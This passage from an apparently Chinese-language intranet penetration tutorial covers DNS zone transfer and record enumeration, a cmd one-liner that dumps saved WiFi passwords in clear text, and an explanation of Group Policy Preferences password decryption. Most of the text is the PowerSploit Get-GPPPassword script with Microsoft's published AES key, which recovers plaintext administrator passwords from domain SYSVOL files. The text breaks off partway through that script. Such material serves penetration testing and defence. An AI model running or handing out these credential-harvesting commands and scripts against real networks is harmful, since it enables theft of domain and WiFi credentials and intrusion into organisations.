title="linux"></a>linux</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dig  @dns.domain.com axfr domain.com</span><br></pre></td></tr></table></figure><h3 id="DNS记录获取"><a href="#DNS记录获取" class="headerlink" title="DNS记录获取"></a>DNS记录获取</h3><p>在网内收集dns记录，可以快速定位一些机器、网站。常用工具有Dnscmd、PowerView。</p><h4 id="Windows-Server"><a href="#Windows-Server" class="headerlink" title="Windows Server"></a>Windows Server</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Dnscmd /ZonePrint ascotbe.com</span><br><span class="line">Dnscmd /EnumRecords ascotbe.com .</span><br></pre></td></tr></table></figure><p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/44.png?raw=true" alt="image-20200730233830776"></p><h4 id="非Windows-Server"><a href="#非Windows-Server" class="headerlink" title="非Windows Server"></a>非Windows Server</h4><p>如果权限不足的话是没办法运行ps脚本的</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#脚本位置https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1</span></span><br><span class="line">import-module  PowerView.ps1</span><br><span class="line">Get-DNSRecord  -ZoneName ascotbe.com</span><br></pre></td></tr></table></figure><h3 id="WIFI"><a href="#WIFI" class="headerlink" title="WIFI"></a>WIFI</h3><p>通过如下命令获取连接过的wifi密码，只能用CMD运行Powershell会报错</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> /f  <span class="string">&quot;skip=9 tokens=1,2 delims=:&quot;</span> %i <span class="keyword">in</span> (<span class="string">&#x27;netsh wlan show profiles&#x27;</span>)  <span class="keyword">do</span>  @<span class="built_in">echo</span> %j | findstr -i -v <span class="built_in">echo</span> |  netsh wlan show profiles %j key=clear</span><br></pre></td></tr></table></figure><p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/45.png?raw=true" alt="image-20200730225857646"></p><h3 id="GPP"><a href="#GPP" class="headerlink" title="GPP"></a>GPP</h3><p>当分发组策略时，会在域的SYSVOL目录下生成一个gpp配置的xml文件，如果在配置组策略时填入了密码，则其中会存在加密过的账号密码。这些密码，往往都是管理员的密码。</p><p>其中xml中的密码是aes加密的，密钥已被微软公开</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;docs.microsoft.com&#x2F;en-us&#x2F;openspecs&#x2F;windows_protocols&#x2F;ms-gppref&#x2F;2c15cbf0-f086-4c74-8b70-1f2fa45dd4be?redirectedfrom&#x3D;MSDN</span><br></pre></td></tr></table></figure><p>可以使用相关脚本进行解密，如</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Get-GPPPassword</span></span> &#123;</span><br><span class="line"><span class="comment">&lt;#</span></span><br><span class="line"><span class="comment"><span class="doctag">.SYNOPSIS</span></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    Retrieves the plaintext password and other information for accounts pushed through Group Policy Preferences.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    PowerSploit Function: Get-GPPPassword</span></span><br><span class="line"><span class="comment">    Author: Chris Campbell (@obscuresec)</span></span><br><span class="line"><span class="comment">    License: BSD 3-Clause</span></span><br><span class="line"><span class="comment">    Required Dependencies: None</span></span><br><span class="line"><span class="comment">    Optional Dependencies: None</span></span><br><span class="line"><span class="comment"> </span></span><br><span class="line"><span class="comment"><span class="doctag">.DESCRIPTION</span></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    Get-GPPPassword searches a domain controller for groups.xml, scheduledtasks.xml, services.xml and datasources.xml and returns plaintext passwords.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"><span class="doctag">.PARAMETER Server</span></span></span><br><span class="line"><span class="comment">    </span></span><br><span class="line"><span class="comment">    Specify the domain controller to search for. </span></span><br><span class="line"><span class="comment">    Default&#x27;s to the users current domain</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"><span class="doctag">.EXAMPLE</span></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    PS C:\&gt; Get-GPPPassword</span></span><br><span class="line"><span class="comment">    </span></span><br><span class="line"><span class="comment">    NewName   : [BLANK]</span></span><br><span class="line"><span class="comment">    Changed   : &#123;2014-02-21 05:28:53&#125;</span></span><br><span class="line"><span class="comment">    Passwords : &#123;password12&#125;</span></span><br><span class="line"><span class="comment">    UserNames : &#123;test1&#125;</span></span><br><span class="line"><span class="comment">    File      : \\DEMO.LAB\SYSVOL\demo.lab\Policies\&#123;31B2F340-016D-11D2-945F-00C04FB984F9&#125;\MACHINE\Preferences\DataSources\DataSources.xml</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    NewName   : &#123;mspresenters&#125;</span></span><br><span class="line"><span class="comment">    Changed   : &#123;2013-07-02 05:43:21, 2014-02-21 03:33:07, 2014-02-21 03:33:48&#125;</span></span><br><span class="line"><span class="comment">    Passwords : &#123;Recycling*3ftw!, password123, password1234&#125;</span></span><br><span class="line"><span class="comment">    UserNames : &#123;Administrator (built-in), DummyAccount, dummy2&#125;</span></span><br><span class="line"><span class="comment">    File      : \\DEMO.LAB\SYSVOL\demo.lab\Policies\&#123;31B2F340-016D-11D2-945F-00C04FB984F9&#125;\MACHINE\Preferences\Groups\Groups.xml</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    NewName   : [BLANK]</span></span><br><span class="line"><span class="comment">    Changed   : &#123;2014-02-21 05:29:53, 2014-02-21 05:29:52&#125;</span></span><br><span class="line"><span class="comment">    Passwords : &#123;password, password1234$&#125;</span></span><br><span class="line"><span class="comment">    UserNames : &#123;administrator, admin&#125;</span></span><br><span class="line"><span class="comment">    File      : \\DEMO.LAB\SYSVOL\demo.lab\Policies\&#123;31B2F340-016D-11D2-945F-00C04FB984F9&#125;\MACHINE\Preferences\ScheduledTasks\ScheduledTasks.xml</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    NewName   : [BLANK]</span></span><br><span class="line"><span class="comment">    Changed   : &#123;2014-02-21 05:30:14, 2014-02-21 05:30:36&#125;</span></span><br><span class="line"><span class="comment">    Passwords : &#123;password, read123&#125;</span></span><br><span class="line"><span class="comment">    UserNames : &#123;DEMO\Administrator, admin&#125;</span></span><br><span class="line"><span class="comment">    File      : \\DEMO.LAB\SYSVOL\demo.lab\Policies\&#123;31B2F340-016D-11D2-945F-00C04FB984F9&#125;\MACHINE\Preferences\Services\Services.xml</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"><span class="doctag">.EXAMPLE</span></span></span><br><span class="line"><span class="comment">    PS C:\&gt; Get-GPPPassword -Server EXAMPLE.COM</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    NewName   : [BLANK]</span></span><br><span class="line"><span class="comment">    Changed   : &#123;2014-02-21 05:28:53&#125;</span></span><br><span class="line"><span class="comment">    Passwords : &#123;password12&#125;</span></span><br><span class="line"><span class="comment">    UserNames : &#123;test1&#125;</span></span><br><span class="line"><span class="comment">    File      : \\EXAMPLE.COM\SYSVOL\demo.lab\Policies\&#123;31B2F340-016D-11D2-945F-00C04FB982DA&#125;\MACHINE\Preferences\DataSources\DataSources.xml</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    NewName   : &#123;mspresenters&#125;</span></span><br><span class="line"><span class="comment">    Changed   : &#123;2013-07-02 05:43:21, 2014-02-21 03:33:07, 2014-02-21 03:33:48&#125;</span></span><br><span class="line"><span class="comment">    Passwords : &#123;Recycling*3ftw!, password123, password1234&#125;</span></span><br><span class="line"><span class="comment">    UserNames : &#123;Administrator (built-in), DummyAccount, dummy2&#125;</span></span><br><span class="line"><span class="comment">    File      : \\EXAMPLE.COM\SYSVOL\demo.lab\Policies\&#123;31B2F340-016D-11D2-945F-00C04FB9AB12&#125;\MACHINE\Preferences\Groups\Groups.xml</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"><span class="doctag">.EXAMPLE</span></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    PS C:\&gt; Get-GPPPassword | ForEach-Object &#123;$_.passwords&#125; | Sort-Object -Uniq</span></span><br><span class="line"><span class="comment">    </span></span><br><span class="line"><span class="comment">    password</span></span><br><span class="line"><span class="comment">    password12</span></span><br><span class="line"><span class="comment">    password123</span></span><br><span class="line"><span class="comment">    password1234</span></span><br><span class="line"><span class="comment">    password1234$</span></span><br><span class="line"><span class="comment">    read123</span></span><br><span class="line"><span class="comment">    Recycling*3ftw!</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"><span class="doctag">.LINK</span></span></span><br><span class="line"><span class="comment">    </span></span><br><span class="line"><span class="comment">    http://www.obscuresecurity.blogspot.com/2012/05/gpp-password-retrieval-with-powershell.html</span></span><br><span class="line"><span class="comment">    https://github.com/mattifestation/PowerSploit/blob/master/Recon/Get-GPPPassword.ps1</span></span><br><span class="line"><span class="comment">    http://esec-pentest.sogeti.com/exploiting-windows-2008-group-policy-preferences</span></span><br><span class="line"><span class="comment">    http://rewtdance.blogspot.com/2012/06/exploiting-windows-2008-group-policy.html</span></span><br><span class="line"><span class="comment">#&gt;</span></span><br><span class="line">    </span><br><span class="line">    [<span class="type">CmdletBinding</span>()]</span><br><span class="line">    <span class="keyword">Param</span> (</span><br><span class="line">            [<span class="type">ValidateNotNullOrEmpty</span>()]</span><br><span class="line">            [<span class="built_in">String</span>]</span><br><span class="line">            <span class="variable">$Server</span> = <span class="variable">$Env:USERDNSDOMAIN</span></span><br><span class="line">    )</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#Some XML issues between versions</span></span><br><span class="line">    <span class="built_in">Set-StrictMode</span> <span class="literal">-Version</span> <span class="number">2</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">#define helper function that decodes and decrypts password</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">Get-DecryptedCpassword</span></span> &#123;</span><br><span class="line">        [<span class="type">CmdletBinding</span>()]</span><br><span class="line">        <span class="keyword">Param</span> (</span><br><span class="line">            [<span class="built_in">string</span>] <span class="variable">$Cpassword</span> </span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">#Append appropriate padding based on string length  </span></span><br><span class="line">            <span class="variable">$Mod</span> = (<span class="variable">$Cpassword</span>.length % <span class="number">4</span>)</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">switch</span> (<span class="variable">$Mod</span>) &#123;</span><br><span class="line">            <span class="string">&#x27;1&#x27;</span> &#123;<span class="variable">$Cpassword</span> = <span class="variable">$Cpassword</span>.Substring(<span class="number">0</span>,<span class="variable">$Cpassword</span>.Length <span class="literal">-1</span>)&#125;</span><br><span class="line">            <span class="string">&#x27;2&#x27;</span> &#123;<span class="variable">$Cpassword</span> += (<span class="string">&#x27;=&#x27;</span> * (<span class="number">4</span> - <span class="variable">$Mod</span>))&#125;</span><br><span class="line">            <span class="string">&#x27;3&#x27;</span> &#123;<span class="variable">$Cpassword</span> += (<span class="string">&#x27;=&#x27;</span> * (<span class="number">4</span> - <span class="variable">$Mod</span>))&#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$Base64Decoded</span> = [<span class="type">Convert</span>]::FromBase64String(<span class="variable">$Cpassword</span>)</span><br><span class="line">            </span><br><span class="line">            <span class="comment">#Create a new AES .NET Crypto Object</span></span><br><span class="line">            <span class="variable">$AesObject</span> = <span class="built_in">New-Object</span> System.Security.Cryptography.AesCryptoServiceProvider</span><br><span class="line">            [<span class="built_in">Byte</span>[]] <span class="variable">$AesKey</span> = <span class="selector-tag">@</span>(<span class="number">0</span>x4e,<span class="number">0</span>x99,<span class="number">0</span>x06,<span class="number">0</span>xe8,<span class="number">0</span>xfc,<span class="number">0</span>xb6,<span class="number">0</span>x6c,<span class="number">0</span>xc9,<span class="number">0</span>xfa,<span class="number">0</span>xf4,<span class="number">0</span>x93,<span class="number">0</span>x10,<span class="number">0</span>x62,<span class="number">0</span>x0f,<span class="number">0</span>xfe,<span class="number">0</span>xe8,</span><br><span class="line">                                 <span class="number">0</span>xf4,<span class="number">0</span>x96,<span class="number">0</span>xe8,<span class="number">0</span>x06,<span class="number">0</span>xcc,<span class="number">0</span>x05,<span class="number">0</span>x79,<span class="number">0</span>x90,<span class="number">0</span>x20,<span class="number">0</span>x9b,<span class="number">0</span>x09,<span class="number">0</span>xa4,<span class="number">0</span>x33,<span class="number">0</span>xb6,<span class="number">0</span>x6c,<span class="number">0</span>x1b)</span><br><span class="line">            </span><br><span class="line">            <span class="comment">#Set IV to all nulls to prevent dynamic generation of IV value</span></span><br><span class="line">            <span class="variable">$AesIV</span> = <span class="built_in">New-Object</span> Byte[](<span class="variable">$AesObject</span>.IV.Length) </span><br><span class="line">            <span class="variable">$AesObject</span>.IV = <span class="variable">$AesIV</span></span><br><span class="line">            <span class="variable">$AesObject</span>.Key = <span class="variable">$AesKey</span></span><br><span class="line">            <span class="variable">$DecryptorObject</span> = <span class="variable">$AesObject</span>.CreateDecryptor() </span><br><span class="line">            [<span class="built_in">Byte</span>[]] <span class="variable">$OutBlock</span> = <span class="variable">$DecryptorObject</span>.TransformFinalBlock(<span class="variable">$Base64Decoded</span>, <span class="number">0</span>, <span class="variable">$Base64Decoded</span>.length)</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">return</span> [<span class="type">System.Text.UnicodeEncoding</span>]::Unicode.GetString(<span class="variable">$OutBlock</span>)</span><br><span class="line">        &#125; </span><br><span class="line">        </span><br><span class="line">        <span class="keyword">catch</span> &#123;<span class="built_in">Write-Error</span> <span class="variable">$Error</span>[<span class="number">0</span>]&#125;</span><br><span class="line">    &#125;  </span><br><span class="line">    </span><br><span class="line">    <span class="comment">#define helper function to parse fields from xml files</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">Get-GPPInnerFields</span></span> &#123;</span><br><span class="line">    [<span class="type">CmdletBinding</span>()]</span><br><span class="line">        <span class="keyword">Param</span> (</span><br><span class="line">            <span class="variable">$File</span></span><br><span class="line">        )</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            </span><br><span class="line">            <span class="variable">$Filename</span> = <span class="built_in">Split-Path</span> <span class="variable">$File</span> <span class="literal">-Leaf</span></span><br><span class="line">            [<span class="built_in">xml</span>] <span class="variable">$Xml</span> = <span class="built_in">Get-Content</span> (<span class="variable">$File</span>)</span><br><span class="line"></span><br><span class="line">            <span class="comment">#declare empty arrays</span></span><br><span class="line">            <span class="variable">$Cpassword</span> = <span class="selector-tag">@</span>()</span><br><span class="line">            <span class="variable">$UserName</span> = <span class="selector-tag">@</span>()</span><br><span class="line">            <span class="variable">$NewName</span> = <span class="selector-tag">@</span>()</span><br><span class="line">            <span class="variable">$Changed</span> = <span class="selector-tag">@</span>()</span><br><span class="line">            <span class="variable">$Password</span> = <span class="selector-tag">@</span>()</span><br><span class="line">    </span><br><span class="line">            <span class="comment">#check for password field</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$Xml</span>.innerxml <span class="operator">-like</span> <span class="string">&quot;*cpassword*&quot;</span>)&#123;</span><br><span class="line">            </span><br><span class="line">                <span class="built_in">Write-Verbose</span> <span class="string">&quot;Potential password in <span class="variable">$File</span>&quot;</span></span><br><span class="line">                </span><br><span class="line">                <span class="keyword">switch</span> (<span class="variable">$Filename</span>) &#123;</span><br><span class="line"></span><br><span class="line">                    <span class="string">&#x27;Groups.xml&#x27;</span> &#123;</span><br><span class="line">                        <span class="variable">$Cpassword</span> += , <span class="variable">$Xml</span> | <span class="built_in">Select-Xml</span> <span class="string">&quot;/Groups/User/Properties/@cpassword&quot;</span> | <span class="built_in">Select-Object</span> <span class="literal">-Expand</span> Node | <span class="built_in">ForEach-Object</span> &#123;<span class="variable">$_</span>.Value&#125;</span><br><span class="line">                        <span class="variable">$UserName</span> += , <span class="variable">$Xml</span> | <span class="built_in">Select-Xml</span> <span class="string">&quot;/Groups/User/Properties/@userName&quot;</span> | <span class="built_in">Select-Object</span> <span class="literal">-Expand</span> Node | <span class="built_in">ForEach-Object</span> &#123;<span class="variable">$_</span>.Value&#125;</span><br><span class="line">                        <span class="variable">$NewName</span> += , <span class="variable">$Xml</span> | <span class="built_in">Select-Xml</span> <span class="string">&quot;/Groups/User/Properties/@newName&quot;</span> | <span class="built_in">Select-Object</span> <span class="literal">-Expand</span> Node | <span class="built_in">ForEach-Object</span> &#123;<span class="variable">$_</span>.Value&#125;</span><br><span class="line">                        <span class="variable">$Changed</span> += , <span class="variable">$Xml</span> | <span class="built_in">Select-Xml</span> <span class="string">&quot;/Groups/User/@changed&quot;</span> | <span class="built_in">Select-Object</span> <span class="literal">-Expand</span> Node | <span class="built_in">ForEach-Object</span> &#123;<span class="variable">$_</span>.Value&#125;</span><br><span class="line">                    &#125;</span><br><span class="line">        </span><br><span class="line">                    <span class="string">&#x27;Services.xml&#x27;</span> &#123;  </span><br><span class="line">                        <span class="variable">$Cpassword</span> += , <span class="variable">$Xml</span> | <span class="built_in">Select-Xml</span> <span class="string">&quot;/NTServices/NTService/Properties/@cpassword&quot;</span> | <span class="built_in">Select-Object</span> <span class="literal">-Expand</span> Node | <span class="built_in">ForEach-Object</span> &#123;<span class="variable">$_</span>.Value&#125;</span><br><span class="line">                        <span class="variable">$UserName</span> += , <span class="variable">$Xml</span> | <span class="built_in">Select-Xml</span> <span class="string">&quot;/NTServices/NTService/Properties/@accountName&quot;</span> | <span class="built_in">Select-Object</span> <span class="literal">-Expand</span> Node | <span class="built_in">ForEach-Object</span> &#123;<span class="variable">$_</span>.Value&#125;</span><br><span class="line">                        <span class="variable">$Changed</span> += , <span class="variable">$Xml</span> | <span class="built_in">Select-Xml</span> <span class="string">&quot;/NTServices/NTService/@changed&quot;</span> | <span class="built_in">Select-Object</span> <span class="literal">-Expand</span> Node | <span class="built_in">ForEach-Object</span> &#123;<span class="variable">$_</span>.Value&#125;</span><br><span class="line">                    &#125;</span><br><span class="line">        </span><br><span class="line">                    <span class="string">&#x27;Scheduledtasks.xml&#x27;</span> &#123;</span><br><span class="line">                        <span class="variable">$Cpassword</span> += , <span class="variable">$Xml</span> | <span class="built_in">Select-Xml</span> <span class="string">&quot;/ScheduledTasks/Task/Properties/@cpassword&quot;</span> | <span class="built_in">Select-Object</span> <span class="literal">-Expand</span> Node | <span class="built_in">ForEach-Object</span> &#123;<span class="variable">$_</span>.Value&#125;</span><br><span class="line">                        <span class="variable">$UserName</span> += , <span class="variable">$Xml</span> | <span class="built_in">Select-Xml</span> <span class="string">&quot;/ScheduledTasks/Task/Properties/@runAs&quot;</span> | <span class="built_in">Select-Object</span> <span class="literal">-Expand</span> Node | <span class="built_in">ForEach-Object</span> &#123;<span class="variable">$_</span>.Value&#125;</span><br><span class="line">                        <span class="variable">$Changed</span> += , <span class="variable">$Xml</span> | <span class="built_in">Select-Xml</span> <span class="string">&quot;/ScheduledTasks/Task/@changed&quot;</span> | <span class="built_in">Select-Object</span> <span class="literal">-Expand</span> Node | <span class="built_in">ForEach-Object</span> &#123;<span class="variable">$_</span>.Value&#125;</span><br><span class="line">                    &#125;</span><br><span class="line">        </span><br><span class="line">                    <span class="string">&#x27;DataSources.xml&#x27;</span> &#123; </span><br><span class="line">                        <span class="variable">$Cpassword</span> += , <span class="variable">$Xml</span> | <span class="built_in">Select-Xml</span> <span class="string">&quot;/DataSources/DataSource/Properties/@cpassword&quot;</span> | <span class="built_in">Select-Object</span> <span class="literal">-Expand</span> Node | <span class="built_in">ForEach-Object</span> &#123;<span class="variable">$_</span>.Value&#125;</span><br><span class="line">                        <span class="variable">$UserName</span> += , <span class="variable">$Xml</span> | <span class="built_in">Select-Xml</span> <span class="string">&quot;/DataSources/DataSource/Properties/@username&quot;</span> | <span class="built_in">Select-Object</span> <span class="literal">-Expand</span> Node | <span class="built_in">ForEach-Object</span> &#123;<span class="variable">$_</span>.Value&#125;</span><br><span class="line">                        <span class="variable">$Changed</span> += , <span class="variable">$Xml</span> | <span class="built_in">Select-Xml</span> <span class="string">&quot;/DataSources/DataSource/@changed&quot;</span> | <span class="built_in">Select-Object</span> <span class="literal">-Expand</span> Node | <span class="built_in">ForEach-Object</span> &#123;<span class="variable">$_</span>.Value&#125;                          </span><br><span class="line">                    &#125;</span><br><span class="line">                    </span><br><span class="line">                    <span class="string">&#x27;Printers.xml&#x27;</span> &#123; </span><br><span class="line">                        <span class="variable">$Cpassword</span> += , <span class="variable">$Xml</span> | <span class="built_in">Select-Xml</span> <span class="string">&quot;/Printers/SharedPrinter/Properties/@cpassword&quot;</span> | <span class="built_in">Select-Object</span> <span class="literal">-Expand</span> Node | <span class="built_in">ForEach-Object</span> &#123;<span class="variable">$_</span>.Value&#125;</span><br><span class="line">                        <span class="variable">$UserName</span> += , <span class="variable">$Xml</span> | <span class="built_in">Select-Xml</span> <span class="string">&quot;/Printers/SharedPrinter/Properties/@username&quot;</span> | <span class="built_in">Select-Object</span> <span class="literal">-Expand</span> Node | <span class="built_in">ForEach-Object</span> &#123;<span class="variable">$_</span>.Value&#125;</span><br><span class="line">                        <span class="variable">$Changed</span> += , <span class="variable">$Xml</span> | <span class="built_in">Select-Xml</span> <span class="string">&quot;/Printers/SharedPrinter/@changed&quot;</span> | <span class="built_in">Select-Object</span> <span class="literal">-Expand</span> Node | <span class="built_in">ForEach-Object</span> &#123;<span class="variable">$_</span>.Value&#125;</span><br><span class="line">                    &#125;</span><br><span class="line">  </span><br><span class="line">                    <span class="string">&#x27;Drives.xml&#x27;</span> &#123; </span><br><span class="line">                        <span class="variable">$Cpassword</span> += , <span class="variable">$Xml</span> | <span class="built_in">Select-Xml</span> <span class="string">&quot;/Drives/Drive/Properties/@cpassword&quot;</span> | <span class="built_in">Select-Object</span> <span class="literal">-Expand</span> Node | <span class="built_in">ForEach-Object</span> &#123;<span class="variable">$_</span>.Value&#125;</span><br><span class="line">                        <span class="variable">$UserName</span> += , <span class="variable">$Xml</span> | <span class="built_in">Select-Xml</span> <span class="string">&quot;/Drives/Drive/Properties/@username&quot;</span> | <span class="built_in">Select-Object</span> <span class="literal">-Expand</span> Node | <span class="built_in">ForEach-Object</span> &#123;<span class="variable">$_</span>.Value&#125;</span><br><span class="line">                        <span class="variable">$Changed</span> += , <span class="variable">$Xml</span> | <span class="built_in">Select-Xml</span> <span class="string">&quot;/Drives/Drive/@changed&quot;</span> | <span class="built_in">Select-Object</span> <span class="literal">-Expand</span> Node | <span class="built_in">ForEach-Object</span> &#123;<span class="variable">$_</span>.Value&#125; </span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">           &#125;</span><br><span class="line">                     </span><br><span class="line">           <span class="keyword">foreach</span> (<span class="variable">$Pass</span> <span class="keyword">in</span> <span class="variable">$Cpassword</span>) &#123;</span><br><span class="line">               <span class="built_in">Write-Verbose</span> <span class="string">&quot;Decrypting <span class="variable">$Pass</span>&quot;</span></span><br><span class="line">               <span class="variable">$DecryptedPassword</span> = <span class="built_in">Get-DecryptedCpassword</span> <span class="variable">$Pass</span></span><br><span class="line">               <span class="built_in">Write-Verbose</span> <span class="string">&quot;Decrypted a password of <span class="variable">$DecryptedPassword</span>&quot;</span></span><br><span class="line">               <span class="comment">#append any new passwords to array</span></span><br><span class="line">               <span class="variable">$Password</span> += , <span class="variable">$DecryptedPassword</span></span><br><span class="line">           &#125;</span><br><span class="line">            </span><br><span class="line">            <span class="comment">#put [BLANK] in variables</span></span><br><span class="line">            <span class="keyword">if</span> (!(<span class="variable">$Password</span>)) &#123;<span class="variable">$Password</span> = <span class="string">&#x27;[BLANK]&#x27;</span>&#125;</span><br><span class="line">            <span class="keyword">if</span> 